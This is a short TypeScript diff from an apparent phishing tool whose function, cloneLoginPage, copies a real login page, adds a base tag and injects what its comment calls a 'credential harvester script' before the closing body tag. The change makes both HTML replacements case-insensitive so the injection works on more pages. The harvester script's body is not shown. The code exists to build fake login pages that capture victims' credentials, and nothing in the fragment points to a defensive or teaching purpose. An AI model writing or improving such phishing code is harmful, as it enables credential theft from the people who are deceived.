@@ -99,7 +99,7 @@ export async function cloneLoginPage(input: PageClonerInput): Promise<PageCloner
     const baseTag = `<base href="${url.origin}">`;
     
     if (html.includes('<head>')) {
-        html = html.replace(/(<head>)/, `$1${baseTag}`);
+        html = html.replace(/(<head>)/i, `$1${baseTag}`);
     } else {
         html = baseTag + html;
     }
@@ -108,7 +108,7 @@ export async function cloneLoginPage(input: PageClonerInput): Promise<PageCloner
     // 2. Inject the credential harvester script before the closing body tag
     const script = getHarvesterScript(redirectUrl);
     if (html.includes('</body>')) {
-      html = html.replace(/<\/body>/, `${script}</body>`);
+      html = html.replace(/<\/body>/i, `${script}</body>`);
     } else {
       html = html + script;
     }
